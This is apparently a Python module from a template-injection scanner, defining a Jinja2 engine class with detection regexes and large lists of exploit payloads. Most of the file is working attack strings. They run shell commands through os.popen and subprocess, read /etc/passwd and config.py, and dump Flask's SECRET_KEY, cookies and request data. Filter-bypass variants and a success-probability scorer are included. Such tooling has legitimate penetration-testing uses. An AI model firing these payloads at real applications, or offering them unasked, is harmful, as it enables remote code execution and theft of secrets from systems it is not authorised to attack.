"""
Jinja2 template engine detection and exploitation.

Jinja2 is the most popular Python template engine, used by Flask
and many other Python web frameworks.
"""

import re
from typing import List

from .base import TemplateEngine, VulnerabilityType


class Jinja2Engine(TemplateEngine):
    """Jinja2 template engine detection and exploitation."""
    
    def __init__(self):
        super().__init__("Jinja2")
    
    def _initialize_patterns(self) -> None:
        """Initialize Jinja2-specific detection patterns."""
        # Error patterns that indicate Jinja2
        self.error_patterns = [
            re.compile(r'jinja2\.exceptions\.\w+', re.IGNORECASE),
            re.compile(r'TemplateSyntaxError', re.IGNORECASE),
            re.compile(r'UndefinedError', re.IGNORECASE),
            re.compile(r'jinja2\.runtime\.Undefined', re.IGNORECASE),
            re.compile(r'Template.*line \d+', re.IGNORECASE),
        ]
        
        # Signature patterns
        self.signatures = [
            re.compile(r'\{\{.*\}\}'),  # Jinja2 expressions
            re.compile(r'\{%.*%\}'),    # Jinja2 statements
            re.compile(r'\{#.*#\}'),    # Jinja2 comments
        ]
    
    def _initialize_payloads(self) -> None:
        """Initialize Jinja2-specific payloads."""
        self.payloads = {
            VulnerabilityType.INFORMATION_DISCLOSURE: [
                "{{config}}",
                "{{config.items()}}",
                "{{request}}",
                "{{request.environ}}",
                "{{request.args}}",
                "{{request.cookies}}",
                "{{request.headers}}",
                "{{session}}",
                "{{g}}",
                "{{url_for.__globals__}}",
                "{{get_flashed_messages.__globals__}}",
                "{{request.application.__self__._get_data_for_json}}",
            ],
            
            VulnerabilityType.CODE_EXECUTION: [
                "{{7*7}}",
                "{{7*'7'}}",
                "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                "{{url_for.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"id\").read()')}}",
                "{{config.__class__.__init__.__globals__['os'].listdir('.')}}",
                "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
                "{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['open']('/etc/passwd').read()}}",
                "{{request.__class__.__mro__[8].__subclasses__()[14].__init__.__globals__.popen('id').read()}}",
                "{{lipsum.__globals__['os'].popen('id').read()}}",
                "{{cycler.__init__.__globals__.os.popen('id').read()}}",
                "{{joiner.__init__.__globals__.os.popen('id').read()}}",
            ],
            
            VulnerabilityType.FILE_ACCESS: [
                "{{get_flashed_messages.__globals__['__builtins__'].open('/etc/passwd').read()}}",
                "{{url_for.__globals__['__builtins__'].open('/etc/passwd').read()}}",
                "{{config.__class__.__init__.__globals__['os'].listdir('/')}}",
                "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
                "{{''.__class__.__mro__[2].__subclasses__()[40]('config.py').read()}}",
            ],
            
            VulnerabilityType.BLIND_INJECTION: [
                "{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['time'].sleep(5)}}",
                "{{lipsum.__globals__['time'].sleep(5)}}",
                "{{url_for.__globals__['time'].sleep(5)}}",
                "{{config.__class__.__init__.__globals__['time'].sleep(5)}}",
                "{% set x = lipsum.__globals__.__builtins__.eval('__import__(\"time\").sleep(5)') %}",
            ]
        }
        
        # Response indicators for payload success
        self.response_indicators = {
            'math_7x7': re.compile(r'\b49\b'),
            'math_7x7_string': re.compile(r'7777777'),
            'config_disclosure': re.compile(r'SECRET_KEY|DEBUG|SQLALCHEMY_DATABASE_URI', re.IGNORECASE),
            'file_access': re.compile(r'root:.*?:/bin/bash|/bin/sh'),
            'directory_listing': re.compile(r'\[.*?\.py.*?\]'),
        }
    
    def get_context_payloads(self, context: str) -> List[str]:
        """Get Jinja2 payloads suitable for specific context."""
        base_payloads = [
            "{{7*7}}",
            "{{7*'7'}}",
            "{{config}}",
            "{{request.args}}",
        ]
        
        if context == 'html':
            # HTML context - basic payloads work well
            return base_payloads + [
                "{{config.__class__}}",
                "{{request.environ.items()}}",
            ]
        
        elif context == 'attr':
            # HTML attribute context - need to be careful with quotes
            return [
                "{{7*7}}",
                "{{config.items()}}",
                "{{request.args.keys()}}",
            ]
        
        elif context == 'js':
            # JavaScript context - more complex escaping needed
            return [
                "{{7*7}}",
                '{{config.get("SECRET_KEY")}}',
                "{{request.environ.get('HTTP_HOST')}}",
            ]
        
        elif context == 'url':
            # URL parameter context
            return [
                "{{7*7}}",
                "{{config}}",
                "{{request.path}}",
            ]
        
        else:
            return base_payloads
    
    def get_bypass_payloads(self) -> List[str]:
        """Get payloads that attempt to bypass common filters."""
        return [
            # Attribute access bypasses
            "{{config['SECRET_KEY']}}",
            "{{config.get('SECRET_KEY')}}",
            "{{config|attr('SECRET_KEY')}}",
            "{{config.__getitem__('SECRET_KEY')}}",
            
            # String construction bypasses
            "{{'se'+'cret'}}",
            "{{('secret'|upper)[:6]|lower}}",
            "{{request['__class__']}}",
            
            # Filter bypasses
            "{{config|string}}",
            "{{config|list}}",
            "{{config|attr('items')|list}}",
            
            # Unicode bypasses
            "{{\u0063onfig}}",  # config with unicode 'c'
            "{{re\u0071uest}}",  # request with unicode 'q'
            
            # Comment bypasses
            "{{config/*comment*/}}",
            "{{config{#comment#}}}",
            
            # Concatenation bypasses
            "{{(config.__class__.__init__.__globals__)['os'].popen('id').read()}}",
            "{{(lipsum|attr('__globals__'))['os'].popen('id').read()}}",
        ]
    
    def get_rce_payloads(self) -> List[str]:
        """Get remote code execution payloads for Jinja2."""
        return [
            # Classic RCE payloads
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "{{url_for.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"id\").read()')}}",
            "{{lipsum.__globals__['os'].popen('id').read()}}",
            "{{cycler.__init__.__globals__.os.popen('id').read()}}",
            
            # Alternative RCE methods
            "{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").system(\"id\")')}}",
            "{{request.__class__.__mro__[8].__subclasses__()[14].__init__.__globals__.popen('id').read()}}",
            "{{get_flashed_messages.__globals__['__builtins__']['__import__']('subprocess').check_output('id',shell=True)}}",
            
            # Python subprocess module
            "{{config.__class__.__init__.__globals__['__builtins__']['__import__']('subprocess').check_output('id', shell=True)}}",
            "{{url_for.__globals__['__builtins__']['__import__']('subprocess').Popen('id', shell=True, stdout=-1).communicate()[0]}}",
            
            # Through other globals
            "{{dict.__new__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}",
            "{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"id\").read()')}}",
        ]
    
    def estimate_payload_success(self, payload: str, context: str) -> float:
        """Estimate Jinja2 payload success probability."""
        # Start with base estimation
        probability = super().estimate_payload_success(payload, context)
        
        # Jinja2-specific adjustments
        if '{{' in payload and '}}' in payload:
            probability += 0.2  # Proper Jinja2 syntax
        
        if 'config' in payload:
            probability += 0.1  # config is commonly available
        
        if 'request' in payload:
            probability += 0.1  # request is commonly available in Flask
        
        if '__globals__' in payload:
            probability -= 0.1  # More advanced, might be filtered
        
        if len(payload) > 200:
            probability -= 0.2  # Very long payloads less likely to work
        
        # Context-specific adjustments
        if context == 'html':
            probability += 0.1  # HTML context usually works well
        elif context == 'attr':
            probability -= 0.1  # Attribute context has more restrictions
        elif context == 'js':
            probability -= 0.2  # JavaScript context more challenging
        
        return max(0.0, min(1.0, probability))
